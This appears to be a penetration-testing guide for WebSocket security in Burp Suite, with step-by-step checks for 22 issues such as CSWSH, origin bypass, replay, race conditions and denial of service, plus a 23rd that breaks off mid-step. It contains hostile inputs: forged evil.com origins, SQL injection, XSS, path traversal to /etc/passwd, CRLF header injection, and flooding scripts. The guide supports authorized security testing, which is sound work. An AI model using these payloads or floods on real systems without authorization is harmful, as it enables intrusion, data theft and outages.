1. Unauthenticated WebSocket Connection Access
Steps:

Open Burp Suite → Go to Proxy tab → Click Open Browser → This opens Burp's built-in Chromium browser with interception ready
Visit the target application and log in with your valid account → Navigate to any feature that uses real-time updates (chat, notifications, live dashboard) — this triggers the WebSocket connection
Go to Burp Suite → Proxy tab → WebSockets history sub-tab → You will now see all WebSocket messages being sent and received → Click on any message and look at the full URL at the top (e.g., wss://target.com/ws)
Right-click on any WebSocket message in the history → Click "Send to Repeater" → Go to the Repeater tab → You will see the WebSocket message ready to resend
Now go to Burp → Proxy → HTTP history → Find the WebSocket Upgrade request (it shows method GET with 101 Switching Protocols response) → Right-click → Send to Repeater
In Repeater, look at the Upgrade request headers — find and delete these headers completely:

Cookie: session=abc123
Authorization: Bearer eyJ...

Click Send in Repeater with no auth headers → See if the server responds with 101 Switching Protocols (connection accepted) or 401/403 (rejected)
If connection is accepted, switch to the WebSocket Repeater tab → Send this message:

json{"action":"getProfile","userId":1}
Check if real data comes back in the response panel

Also go to Proxy → Options → Match and Replace → Add a rule to automatically strip the Cookie header from all WebSocket upgrade requests → Browse the app and see if WebSocket still works

🔴 Vulnerable When:

The server responds with 101 Switching Protocols even after you removed all auth headers from the Upgrade request
After connecting, you send {"action":"getProfile"} and get back real data like {"email":"user@site.com","role":"admin"}
Burp WebSocket history shows data flowing with no auth headers present in the upgrade request

Severity: CRITICAL

2. Cross-Site WebSocket Hijacking (CSWSH)
Steps:

Open Burp Suite → Proxy → WebSockets history → Find any WebSocket message → Note the full WebSocket URL
Go to Proxy → HTTP history → Find the WebSocket Upgrade request (101 Switching Protocols) → Right-click → Send to Repeater
In Repeater, look at the Origin header in the Upgrade request — it will show something like:

Origin: https://target.com

Change the Origin header to a completely different domain:

Origin: https://evil.com
Click Send → Check if server still responds with 101 Switching Protocols

Try more Origin values one by one:

Origin: https://evil-target.com
Origin: https://target.com.evil.com
Origin: null
Origin: https://localhost
Click Send for each and note which ones the server accepts

Go to Burp Suite → Collaborator tab → Click Copy to clipboard → You get a unique URL like https://abc123.oastify.com
Now go to Burp → Proxy → Options → Match and Replace → Add rule: Replace Origin: https://target.com with Origin: https://abc123.oastify.com
Open Burp's built-in browser → Browse the target app while logged in → Watch if WebSocket connects with the replaced Origin
Go back to Collaborator tab → Click Poll now → Check if any interaction was received from the target server using your collaborator origin
Also use Burp's CSRF PoC Generator → Go to HTTP history → Find the WebSocket Upgrade GET request → Right-click → Engagement tools → Generate CSRF PoC → Enable Include auto-submit script → Copy the HTML → This simulates the CSWSH attack page

🔴 Vulnerable When:

Server returns 101 Switching Protocols when you change Origin to https://evil.com — meaning it does not validate Origin at all
The server accepts Origin: null — this is especially dangerous as sandboxed iframes send null origin
CSRF PoC page successfully establishes a WebSocket connection using victim's cookies from a different origin

Severity: CRITICAL

3. WebSocket Message Injection from Malicious Origin
Steps:

Open Burp Suite → Proxy → WebSockets history → Identify all message types the app sends (look for action types like {"action":"getUser"}, {"type":"subscribe"}, {"cmd":"update"})
Pick one WebSocket message → Right-click → Send to Repeater
In Repeater, go to the WebSocket connection panel → In the message body try injecting special characters one at a time:

json{"action":"getUser","id":"1'"}
{"action":"getUser","id":"1\""}
{"action":"getUser","id":"<script>alert(1)</script>"}
{"action":"getUser","id":"1 OR 1=1"}
{"action":"getUser","id":"../../../etc/passwd"}

For each payload, click Send and carefully read the response in the right panel — look for error messages, stack traces, or reflected input
Now change the Origin header in the original Upgrade request (find it in HTTP history → Send to Repeater) to:

Origin: https://evil.com
Reconnect and then send the same injected messages — check if the server processes them

Go to Proxy → Options → Match and Replace → Add rule to replace Origin: https://target.com with Origin: https://attacker.com for all WebSocket upgrade requests → Browse the app normally and see if injected messages from wrong origin are processed
In Burp Repeater, try sending messages that reference other users' data:

json{"action":"getUser","id":2}
{"action":"getUser","id":3}
{"action":"deleteMessage","messageId":999}

Check responses for data that doesn't belong to your account

🔴 Vulnerable When:

Server processes and returns data for injected payloads like {"id":"1 OR 1=1"} returning multiple users
Input like <script>alert(1)</script> is reflected back in the response without sanitization
Messages sent from a different Origin are still processed and return valid data
You can access or modify other users' data by changing IDs in messages

Severity: HIGH to CRITICAL

4. WebSocket Message Replay Attack
Steps:

Open Burp Suite → Log into target app → Perform a sensitive action over WebSocket (e.g., transfer money, place order, submit vote, send message) → Go to Proxy → WebSockets history → Find that specific action message
Note the exact message format — for example:

json{"action":"transfer","amount":100,"to":"user123","token":"abc"}

Right-click that message → Send to Repeater → Go to Repeater tab
Click Send again immediately without changing anything → Check if the action executes again (second transfer goes through, second vote counted, etc.)
Wait 5 minutes → Click Send again → Check if it still works (tests if there is a time-based token expiry)
Wait 30 minutes → Click Send again → Still check the response
Close the WebSocket connection in Repeater → Reconnect → Send the same old message → Check if it still works in a new session
Try changing the timestamp field if one exists in the message:

json{"action":"transfer","amount":100,"to":"user123","timestamp":"2020-01-01T00:00:00Z"}
Send it and check if the server rejects old timestamps

Go to Intruder → Set the replayed message as the payload → Sniper attack → Use a Null payloads list with count set to 50 → Click Start attack → This sends the same message 50 times rapidly → Check responses to see how many succeed

🔴 Vulnerable When:

Sending the same action message a second time in Repeater causes the action to execute again (two transfers made, two votes counted)
Old messages with past timestamps are accepted and processed
After reconnecting with a new session, the old captured message still works
Intruder sends 50 identical messages and multiple succeed — no replay protection exists

Severity: HIGH to CRITICAL

5. WebSocket Denial of Service via Message Flooding
Steps:

Open Burp Suite → Proxy → WebSockets history → Find any simple WebSocket message the app sends → Right-click → Send to Intruder
Go to Intruder tab → Positions sub-tab → Clear all positions → The message stays exactly as-is (you're not fuzzing, just repeating)
Go to Payloads tab → Payload type: Null payloads → Select Continue indefinitely or set count to 10000
Go to Resource Pool tab → Create a new resource pool → Set Maximum concurrent requests to 50
Click Start attack → Watch the response times in the results — note when responses start getting slower or timing out
While the attack runs, open the target app in Burp's browser and try to use it normally — note if the app becomes slow or unresponsive
Check the response time column in Intruder results — if average response time increases from 50ms to 5000ms+, the server is being affected
Also try sending a very large message payload in Repeater:

json{"action":"ping","data":"AAAAAAAAAA...AAAAAAAAAA"}
Keep adding A's until the message is 1MB+ → Send it → Check if the server crashes, hangs, or sends an error

In Burp Repeater, repeatedly click Send as fast as you can manually while watching the response → Note any slowdowns

🔴 Vulnerable When:

App response times increase significantly (50ms → 5000ms) when Intruder floods messages
The app becomes unusable in the browser during the Intruder attack
Server accepts messages of unlimited size (1MB+ accepted without error)
Server returns connection reset or stops responding entirely during flood

Severity: HIGH

6. Sensitive Data in WebSocket Messages (Plaintext)
Steps:

Open Burp Suite → Proxy → WebSockets history → Click through every single message in the history → Read all message content carefully
Use Burp's Search feature → Go to WebSockets history → Press Ctrl+F → Search for these terms one at a time:

password
token
secret
key
ssn
credit
card
cvv
email
phone
dob
address

For each message containing sensitive terms, check if the WebSocket connection uses ws:// (unencrypted) or wss:// (encrypted) — look at the URL in the header area of the message
Go to Proxy → HTTP history → Find the WebSocket Upgrade request → Check if it starts with ws:// instead of wss://
Open Burp Suite → Dashboard → New Scan → Select Crawl and Audit → Enter target URL → Under Audit configuration → Make sure Transport layer security is checked → Run the scan → Check findings for WebSocket using unencrypted transport
Go to WebSockets history → Look specifically at server-to-client messages (direction column) → These are what the server pushes to you — check if they include data you didn't ask for (e.g., other users' info, internal IDs, debug info, full objects with hidden fields)
Capture a message that returns user info → Compare what the UI shows vs what the raw WebSocket message contains — the raw message often has extra hidden fields

🔴 Vulnerable When:

WebSocket URL starts with ws:// instead of wss:// — all data is transmitted in plaintext over the network
Server-to-client messages contain password, token, secret, cvv, ssn, or private keys in plaintext
Raw WebSocket messages contain more fields than what the UI displays (hidden data exposure)
Auth tokens sent over WebSocket are long-lived and visible in plaintext in the history

Severity: HIGH to CRITICAL

7. WebSocket Origin Validation Bypass
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request (look for 101 response code) → Right-click → Send to Repeater
In Repeater, look at the Origin header — note the exact value (e.g., Origin: https://target.com)
Try each of these Origin values one at a time — click Send after each and check if you still get 101 Switching Protocols:

Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: https://eviltarget.com
Origin: https://target.com@evil.com
Origin: null
Origin: https://127.0.0.1
Origin: https://localhost
Origin: https://TARGET.COM
Origin: https://target.com:8080

Try removing the Origin header completely from the Upgrade request → Click Send → Check if connection is still accepted
Try adding multiple Origin headers:

Origin: https://target.com
Origin: https://evil.com

Go to Proxy → Options → Match and Replace → Add a rule: Request header → Match: Origin: https://target.com → Replace with: Origin: https://evil.com → Turn this on → Browse the app normally and see if WebSocket still works
For each accepted Origin, also send an actual WebSocket message and check if you get valid data back (connection accepted doesn't always mean messages are processed)

🔴 Vulnerable When:

Server returns 101 Switching Protocols when Origin is changed to https://evil.com
Server accepts connection when Origin header is completely removed
Server accepts Origin: null — dangerous for sandboxed iframe attacks
Server accepts subdomains or typosquatted domains like target.com.evil.com

Severity: CRITICAL

8. WebSocket Subprotocol Negotiation Abuse
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request → Look for this header:

Sec-WebSocket-Protocol: chat, superchat
Note the exact subprotocol names used

Right-click the Upgrade request → Send to Repeater
In Repeater, try changing the subprotocol header to different values one at a time and click Send each time:

Sec-WebSocket-Protocol: admin
Sec-WebSocket-Protocol: debug
Sec-WebSocket-Protocol: internal
Sec-WebSocket-Protocol: v2
Sec-WebSocket-Protocol: raw
Sec-WebSocket-Protocol: binary
Sec-WebSocket-Protocol: stomp
Sec-WebSocket-Protocol: wamp

Check the response for Sec-WebSocket-Protocol in the 101 response headers — note which subprotocols the server agrees to
If a new subprotocol is accepted, connect using it and send messages — check if the response format changes or if you get access to different functionality:

json{"action":"getAdminUsers"}
{"action":"getSystemLogs"}
{"action":"getDebugInfo"}

Try sending no subprotocol in the request when the app normally sends one — see if the server still connects and works
Try sending multiple subprotocols including both valid and fake ones:

Sec-WebSocket-Protocol: chat, admin, debug, internal

Go to Intruder → Send the Upgrade request to Intruder → Mark the subprotocol value as payload position → Use a wordlist of common protocols: admin, debug, v1, v2, internal, raw, binary, stomp, wamp, mqtt, graphql → Run attack → Check which ones return 101

🔴 Vulnerable When:

Server accepts subprotocol values like admin, debug, or internal that expose privileged functionality
Connecting with a different subprotocol gives access to messages/data not available in normal subprotocol
Server accepts any subprotocol without validation (returns 101 for all values you tried)
Debug subprotocol exposes stack traces, internal logs, or system information

Severity: MEDIUM to HIGH

9. WebSocket Extension Negotiation Security Vulnerability
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Look for:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits

Right-click → Send to Repeater
Try modifying the extensions header with these values one at a time:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15; server_max_window_bits=15
Sec-WebSocket-Extensions: permessage-deflate; client_no_context_takeover; server_no_context_takeover
Sec-WebSocket-Extensions: x-webkit-deflate-frame
Sec-WebSocket-Extensions: deflate-frame
Sec-WebSocket-Extensions: unknown-extension

Check the 101 response — look at what Sec-WebSocket-Extensions value the server echoes back — it should only echo what it supports, not arbitrary values
Try adding a fake extension with a very long value:

Sec-WebSocket-Extensions: fake-extension; param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Send it and check if the server crashes or returns an error

Try sending extension parameters with injection characters:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15'; DROP TABLE sessions;--
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=<script>alert(1)</script>

Remove the extension header entirely when the app normally sends one → Connect → Check if the server behaves differently or fails

🔴 Vulnerable When:

Server echoes back an extension you invented (means no validation of extension names)
Server crashes or returns 500 when extension parameter is very long (buffer overflow potential)
Server accepts injection characters in extension parameters without sanitization
Compression parameters allow you to force high compression ratios (sets up CRIME-style attack)

Severity: MEDIUM to HIGH

10. WebSocket Compression Attack (PERMESSAGE-DEFLATE / CRIME-style)
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Check if server negotiates:

Sec-WebSocket-Extensions: permessage-deflate
If present in the response, compression is enabled

Right-click Upgrade request → Send to Repeater → Make sure the extension is accepted in the response
Go to WebSockets history → Find a message that contains a secret value (like a CSRF token, session ID, or auth token) alongside user-controlled input in the same message
In Repeater, send a message where you include the secret prefix in your controlled data:

json{"action":"search","query":"csrftoken=abc","data":"csrftoken=abc"}
Note the size of the compressed response

Send a message where your controlled data does not match the secret:

json{"action":"search","query":"wrongvalue","data":"wrongvalue"}
Note the size — if compression is working, matching content compresses smaller than non-matching

In Burp Repeater, check the actual byte size of responses by looking at the response panel length — compare sizes when your input matches vs doesn't match secret values
Go to Proxy → Options → Enable Show response byte size for WebSocket messages → This helps measure compression differences
Try forcing maximum compression parameters in the upgrade:

Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15; server_max_window_bits=15
🔴 Vulnerable When:

Compression is enabled (permessage-deflate in response) AND user-controlled data appears in the same message as secret tokens
Response byte size measurably differs (even by 1-2 bytes) when your guessed value matches vs doesn't match a secret — this enables oracle-based secret extraction
Server allows maximum window bits, enabling large compression contexts that make the attack easier

Severity: HIGH

11. WebSocket Connection Limit Bypass for Resource Exhaustion
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request → Right-click → Send to Intruder
In Intruder → Positions tab → Clear all positions → Don't mark anything (you're just repeating the same request)
Go to Payloads tab → Payload type: Null payloads → Set count to 500
Go to Resource Pool tab → Create new resource pool → Set Maximum concurrent requests to 100
Click Start Attack → Watch how many connections succeed (look for 101 responses) → Note at what number the server starts returning errors (429, 503, connection refused)
While attack is running, try to open the target app normally in the Burp browser → Check if legitimate users are blocked
After the attack stops, disconnect all connections → Wait 60 seconds → Try connecting again normally → Check if the server has recovered or is still blocking
Also try from different IPs using Burp's upstream proxy settings → Go to User options → Connections → Upstream proxy → Add a proxy → Re-run the attack → See if limit is per-IP or global
Try varying the Cookie header slightly for each request in Intruder → Add a payload position on a custom header:

X-Session-ID: §1§
Payload: Numbers from 1 to 500 → See if each "different session" gets its own connection limit
🔴 Vulnerable When:

You can open more than the documented/expected number of connections from a single IP
At high connection count (500+), legitimate users in the browser can no longer connect
Server has no per-IP connection limit — all 500 connections succeed
After flood, server takes more than 5 minutes to recover normal operation

Severity: HIGH

12. WebSocket Ping/Pong Abuse for Keepalive Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for messages with opcode 9 (ping) or opcode 10 (pong) — Burp shows these in the type/opcode column
Go to Proxy → HTTP history → Find WebSocket Upgrade request → Send to Repeater
In Burp Repeater (WebSocket mode), try sending a ping frame manually — in the message body, set the opcode to Ping if Burp allows it, or use this Python script alongside Burp:

pythonimport websocket
ws = websocket.create_connection("wss://target.com/ws",
    header=["Cookie: session=YOUR_SESSION"])
# Send ping with large payload
ws.ping("A" * 125)  # Max allowed ping payload is 125 bytes per RFC
print(ws.recv())

Try sending a ping with payload larger than 125 bytes (RFC violation):

pythonws.ping("A" * 500)
Check if server crashes or accepts it

In Burp, go to WebSockets history → Find any pong message → Right-click → Send to Repeater → Send it without a preceding ping → See how server reacts to unsolicited pong
Try sending rapid ping frames — use Intruder with null payloads (1000 iterations) on a ping message to see if the server handles rapid pings gracefully or times out
Check what happens if you never send pong in response to server pings — watch in WebSockets history if the server eventually closes the connection and after how long

🔴 Vulnerable When:

Server accepts ping payloads larger than 125 bytes (violates RFC 6455 — server should close connection)
Server crashes or becomes unresponsive when flooded with rapid ping frames
Server never closes connection even when client doesn't respond to pings for a long time (keepalive not enforced)
Unsolicited pong frames cause server errors or unexpected behavior

Severity: MEDIUM

13. WebSocket Fragmentation-Based Attack Vector
Steps:

Open Burp Suite → Proxy → WebSockets history → Find a message that normally gets blocked or filtered (e.g., a message with <script> that the WAF blocks) → Note the exact message
Use Python websocket library alongside Burp (route Python through Burp as proxy):

pythonimport websocket
import socket

ws = websocket.create_connection("wss://target.com/ws",
    http_proxy_host="127.0.0.1",
    http_proxy_port=8080)

# Send fragmented message - split across multiple frames
# First frame: FIN=0 (not final), opcode=1 (text)
# This simulates fragmentation
ws.send_binary(b'\x01' + b'{"action":"get')  # Fragment 1
ws.send_binary(b'\x80' + b'User","id":1}')   # Fragment 2 (FIN=1)

In Burp, go to Proxy → WebSockets history → Watch if the fragmented message arrives as separate fragments or reassembled
Try sending a WAF-bypassing payload via fragmentation — if <script>alert(1)</script> is blocked normally:


Send <scr in first fragment
Send ipt>alert(1)</script> in second fragment
Check if WAF misses it but server processes the full reassembled message


Try sending control frames (ping, pong, close) between continuation frames — RFC 6455 says control frames can be injected between fragmented message frames:

Frame 1: FIN=0, opcode=text, payload="{"action":"get"
Frame 2: FIN=0, opcode=ping (control frame interleaved)
Frame 3: FIN=1, opcode=continuation, payload="User"}"

Send a fragmented message with mismatched opcodes — first frame says text, continuation frame says binary — check if server accepts this RFC violation

🔴 Vulnerable When:

WAF blocks <script>alert(1)</script> as a single message but processes it when split across two fragments
Server accepts fragmented messages with mismatched opcodes (no RFC validation)
Control frames injected between continuation frames cause server to process incomplete messages
Fragmented messages bypass input validation that works on complete messages

Severity: HIGH

14. WebSocket Binary Message Handling Vulnerability
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for messages that show as binary type (not text JSON) — they appear as hex or Base64 in Burp
Right-click a binary message → Send to Repeater → In Repeater, look at the raw binary content
In Repeater, modify the binary message — change byte values one at a time:


If you see a user ID as bytes 00 00 00 01, change it to 00 00 00 02
If you see a role byte 00 (user), change it to 01 (admin)
Click Send after each change and check the response


Try sending a text message where binary is expected:

json{"action":"getUser","id":1}
See if the server crashes or handles it unexpectedly

Try sending binary data with format strings:

\x25\x73\x25\x73\x25\x73\x25\x73  (this is %s%s%s%s in hex)
Check if server crashes or returns unexpected memory data

Try sending binary messages with null bytes embedded:

\x00\x00\x00\x00\x41\x41\x41\x41

In Burp Repeater, try sending a very large binary message (send 100KB of \x41 bytes) → Check if the server crashes or truncates
Try sending malformed binary protocol messages — if you identified the binary format, skip required fields or set lengths to wrong values

🔴 Vulnerable When:

Changing a user ID byte in binary message returns another user's data (IDOR)
Changing a role byte from 0x00 to 0x01 gives admin-level response
Server crashes or returns 500 when receiving text messages in binary channels
Null bytes in binary messages cause server to truncate processing and return unexpected data

Severity: HIGH to CRITICAL

15. WebSocket Max Message Size Bypass for Buffer Overflow
Steps:

Open Burp Suite → Proxy → WebSockets history → Find a typical message → Note its approximate size in bytes
Right-click a simple message → Send to Repeater → In Repeater, find a string field in the message:

json{"action":"search","query":"test"}

Gradually increase the size of the value:


First send with 100 characters: "query":"AAAA...100 chars"
Then 1,000 characters
Then 10,000 characters
Then 100,000 characters
Then 1,000,000 characters (1MB)


After each send, check: does server return error? Does it truncate? Does it process fully? Does it time out?
Go to Intruder → Send the message to Intruder → Mark the value field as position → Payloads tab → Payload type: Character blocks → Start size: 100, End size: 100000, Step: 1000 → Run attack → Watch at what size responses change
Try sending a message where the length field in the header says X but actual payload is Y:


In Burp, manually edit the WebSocket frame header bytes to set an incorrect length
Or use Python routing through Burp:

python# Send frame claiming 10 bytes but with 10000 bytes of actual data

Check server memory/CPU via app response times — if response gets dramatically slower at certain sizes, note the threshold
Try special characters in large payloads:

json{"query":"A"*9999 + "<script>alert(1)</script>"}
🔴 Vulnerable When:

Server accepts messages of 1MB+ without returning an error or closing the connection
At certain size thresholds (e.g., 65535 bytes), server returns garbled data or crashes (integer overflow in length field)
Large messages cause response times to increase by 10x or more (DoS potential)
Server processes a payload that is larger than the declared length (length field not validated)

Severity: HIGH

16. WebSocket Channel/Subscription Access Control Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Find subscription/channel messages — they typically look like:

json{"action":"subscribe","channel":"user_123_notifications"}
{"action":"join","room":"team_456_chat"}
{"event":"subscribe","data":{"channel":"private-user-1-feed"}}

Right-click a subscription message → Send to Repeater
In Repeater, change the channel/room identifier to belong to another user — if your user ID is 123, try subscribing to user 124's channel:

json{"action":"subscribe","channel":"user_124_notifications"}
{"action":"join","room":"team_789_chat"}
Click Send → Check if subscription succeeds or returns an error

Try subscribing to admin/privileged channels:

json{"action":"subscribe","channel":"admin_logs"}
{"action":"subscribe","channel":"system_events"}
{"action":"subscribe","channel":"all_users"}
{"action":"subscribe","channel":"internal_monitoring"}

If subscription appears to succeed, wait 30 seconds and perform an action on the target app as a different user (or ask someone to) → Check if you receive events in your Repeater WebSocket session that belong to the other user
Try incrementing/decrementing the channel ID systematically → Go to Intruder → Mark the user ID number in the channel name as payload position → Numbers payload from 1 to 200 → Run → Check all 200 responses for successful subscription
Try guessing private channel names using common patterns:

json{"action":"subscribe","channel":"private-admin-events"}
{"action":"subscribe","channel":"system-debug-feed"}
{"action":"subscribe","channel":"internal-audit-log"}
🔴 Vulnerable When:

You successfully subscribe to user_124_notifications (another user's channel) and receive their real-time events
Subscribing to admin_logs or system_events succeeds and you start receiving privileged data
No error is returned when subscribing to channels that don't belong to your account
Intruder sweep shows that channels for all user IDs 1-200 accept your subscription

Severity: CRITICAL

17. WebSocket Race Condition in Message Handling
Steps:

Open Burp Suite → Proxy → WebSockets history → Find a message for a critical action — something that should only happen once (e.g., redeem coupon, claim reward, transfer funds, use one-time token)
Right-click that message → Send to Repeater → Open multiple Repeater tabs (right-click the tab → Duplicate) — create 10 copies of the same message in 10 tabs
In all 10 Repeater tabs, prepare the same message → Now click Send in all tabs as simultaneously as possible (rapidly click each one) → Check all responses — did multiple succeed?
For a more reliable race condition test, use Burp Suite Pro's Send Group in Parallel feature: Select all tabs → Right-click → Send group in parallel (single-packet attack) → This sends all requests in one TCP packet, maximally synchronizing them
If using Burp Community, use this Python script routed through Burp:

pythonimport threading
import websocket

def send_action():
    ws = websocket.create_connection("wss://target.com/ws",
        header=["Cookie: session=YOUR_SESSION"])
    ws.send('{"action":"redeemCoupon","code":"SAVE50"}')
    print(ws.recv())
    ws.close()

# Launch 10 threads simultaneously
threads = [threading.Thread(target=send_action) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

After sending, check the application to see how many times the action was applied (check account balance, order count, coupon usage count in the app)
Also try a race condition on authentication — send login messages simultaneously with multiple guesses to bypass rate limiting on credentials

🔴 Vulnerable When:

Sending the same coupon/reward/transfer message 10 times simultaneously results in it being applied 2+ times
Account balance reflects multiple deductions/additions from a single intended action
"One-time use" token gets consumed multiple times when requests race
Login rate limiting is bypassed because all 10 requests hit before the counter increments

Severity: HIGH to CRITICAL

18. WebSocket Token Refresh in Long-Lived Connections
Steps:

Open Burp Suite → Log into target app → Establish a WebSocket connection → Go to WebSockets history → Note the auth token used in the Upgrade request or in the first message
Go to HTTP history → Find the token refresh endpoint (usually /api/auth/refresh or /api/token/refresh) → Note how token refresh works in the app
Let the WebSocket connection stay idle for 30 minutes without refreshing → Then send a message through the existing connection in Repeater:

json{"action":"getProfile"}
Check if it still works with the original (now potentially expired) token

Manually expire the token: Go to the app's logout → Log back in → This should invalidate the old session → Go back to the Repeater tab with the old WebSocket connection → Send a message → Does the server reject it or still process it?
Go to HTTP history → Find the logout request → Send it (to actually log out and invalidate the session) → Immediately go to the WebSocket Repeater tab → Send a message → Check if the WebSocket connection is also terminated or stays alive
Change your password in the app (which should invalidate all sessions) → Check if your existing WebSocket connection in Repeater still works
Revoke your API token if the app supports it → Check if the WebSocket connection using that token is immediately dropped
Watch WebSockets history for more than 1 hour → Check if the server ever sends a token refresh challenge or closes the connection proactively

🔴 Vulnerable When:

After token expiry (30+ minutes), old WebSocket connection still accepts and processes messages
After logging out and logging in again (which should invalidate old session), the old WebSocket Repeater session still returns valid data
After password change, the old WebSocket connection remains alive and authorized
Server never closes long-lived WebSocket connections even when auth token expires

Severity: HIGH

19. WebSocket Data Exfiltration via Binary Frames
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for binary frame messages → In Burp they show as hex or Base64 encoded content
Right-click a binary message → Send to Repeater → In Repeater, decode the binary content → Use Burp's Decoder tab → Paste the hex content → Try decoding as Base64, then as gzip, then as raw hex
In the binary data, look for patterns:


ASCII strings mixed in (file names, usernames, emails)
Repeating byte patterns (encryption keys, tokens)
File headers (PK = ZIP, %PDF = PDF, FFD8FF = JPEG)


Try sending a message requesting binary data for another user's files:

json{"action":"downloadFile","fileId":"../../etc/passwd"}
{"action":"getAttachment","userId":2,"fileId":1}
Check if binary file data comes back in the response

In Burp, right-click the binary response → Save to file → Open the saved file in a hex editor or just rename it to .pdf/.zip/.jpg and open it — check what the binary data actually contains
Try sending requests for files that should be restricted:

json{"action":"getBinaryData","path":"/admin/exports/users.csv"}
{"action":"getFile","id":"../config/database.yml"}

Check if file data sent over WebSocket binary frames is encrypted or just raw bytes — raw bytes mean data is readable by anyone intercepting the connection

🔴 Vulnerable When:

Binary frames contain readable file contents for files you should not access
Changing userId or fileId in requests returns binary data belonging to other users (IDOR)
Path traversal in file parameters (../../etc/passwd) returns system file contents
Binary data includes embedded credentials, keys, or tokens visible in plain hex

Severity: HIGH to CRITICAL

20. WebSocket Connection State Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → Find the initial handshake and first messages → Note any state-establishing messages (like {"event":"init","userId":1} or {"action":"authenticate","token":"abc"})
Right-click → Send to Repeater → In Repeater, send the authentication/init message twice:

json{"action":"authenticate","token":"valid_token"}
{"action":"authenticate","token":"valid_token"}  ← send again
Check if second auth causes any error or state confusion

Try sending messages out of order — if the normal flow is: connect → authenticate → subscribe → request data, try:


Connect → skip authenticate → go straight to subscribe → check if it works


Send a close frame (opcode 8) and then immediately send another message on the same connection → Check if server processes the post-close message
Try sending the same subscription message twice:

json{"action":"subscribe","channel":"notifications"}
{"action":"subscribe","channel":"notifications"}
Check if you receive duplicate events or an error

Send an authentication message with a different user's token after already being authenticated as your user:

json// Initially authenticated as user1
{"action":"authenticate","token":"USER2_TOKEN_HERE"}
// Did the server switch your identity to user2?
Then request profile data and check whose data you get

Go to Intruder → Send a sequence of state-manipulating messages → Use Pitchfork attack type to send them in specific order → Check responses for state confusion

🔴 Vulnerable When:

Sending auth message twice causes server to respond as if you're unauthenticated (state reset)
Skipping the authentication step and going directly to subscribe/request works without error
After sending a second authentication message with a different user's token, you receive that user's data
Sending duplicate subscription messages causes you to receive duplicate events (server-side state bug)

Severity: HIGH

21. WebSocket Server Identity Verification Bypass
Steps:

Open Burp Suite → Proxy → Options → Intercept Server Responses → Enable it → Visit the target app → Intercept the WebSocket Upgrade response (101 Switching Protocols)
Check if the target uses a self-signed certificate → In Burp, go to Target → Site Map → Click on the target host → Look at the TLS certificate details in the right panel → Check if it's self-signed or from a known CA
Go to Proxy → Options → TLS → Try connecting to the WebSocket endpoint using SSL Strip simulation — add a match/replace rule to change wss:// to ws:// in JavaScript → Check if the app falls back to unencrypted
In Burp's Repeater, connect to the WebSocket using just ws:// instead of wss://:


Change the URL to ws://target.com/ws (no TLS)
Click Connect — does the server accept unencrypted WebSocket connections?


Try connecting to the WebSocket through Burp acting as a man-in-the-middle → If the client accepts Burp's self-signed cert without warning, it means certificate pinning is absent
Check if the Sec-WebSocket-Accept header value in the 101 response is correctly computed:


Burp shows this in the response headers
The correct value must be SHA1 of (Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11") encoded as Base64
Any other value means the server is not properly implementing the WebSocket handshake


Check if the app connects to any hardcoded WebSocket server IP that could be redirected via DNS poisoning → Look in the page source/JS for hardcoded IPs

🔴 Vulnerable When:

Server accepts ws:// (unencrypted) connections in addition to wss://
App accepts Burp's self-signed certificate without any warning (no certificate pinning)
Server responds with incorrect Sec-WebSocket-Accept value (improper handshake validation)
Hardcoded IP addresses are used for WebSocket connection (DNS poisoning vector)

Severity: HIGH

22. WebSocket Cookie-Based Authentication Abuse
Steps:

Open Burp Suite → Proxy → HTTP history → Find the WebSocket Upgrade request → Look at the Cookie header → Note all cookie names and values
Right-click the Upgrade request → Send to Repeater → In the Cookie header, try:


Remove all cookies → Send → Does connection still work?
Remove only the session cookie → Send → Still works?
Keep only the session cookie, remove all others → Send → Works?


Note your session cookie value (e.g., session=abc123) → Log out of the app → Go back to Repeater → Send the Upgrade request with the now-invalidated session cookie → Check if connection is still accepted (session not invalidated server-side)
Look for the HttpOnly and Secure flags on the session cookie → In Burp HTTP history, find the Set-Cookie header → Check flags:

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
Missing flags means the cookie can be stolen via XSS or sent over HTTP

Check the SameSite attribute → If it's None or missing, cookies can be sent cross-site which enables CSWSH
Try using the session cookie from WebSocket in a regular HTTP request to see if the same cookie authenticates HTTP API calls too (shared auth = wider attack surface)
Try modifying the cookie value slightly (session=abc124 instead of abc123) → Check if the server still accepts it (weak session token validation)
Capture an old session cookie (from Burp history) after you've logged in again → Try using it → Should be rejected if proper session management exists

🔴 Vulnerable When:

WebSocket Upgrade request is accepted with no cookies at all
After logging out, the old session cookie still authenticates new WebSocket connections
Session cookie is missing HttpOnly flag (can be stolen via XSS)
Session cookie is missing Secure flag (sent over HTTP)
SameSite=None or missing SameSite allows cookie to be sent cross-origin (CSWSH enabler)

Severity: HIGH to CRITICAL

23. WebSocket Header Injection in Upgrade Request
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Right-click → Send to Repeater
Look at all headers in the Upgrade request — try injecting CRLF (\r\n) into each header value one at a time:

Host: target.com\r\nX-Injected: evil
In Burp Repeater, use %0d%0a as the CRLF sequence:
Host: target.com%0d%0aX-Injected: evil

Try injecting into the Sec-WebSocket-Key header:

Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nX-Admin: true

Try injecting into custom headers that the app sends:

X-User-ID: 123\r\nX-Role: admin

Try Host header injection — change the Host header to:

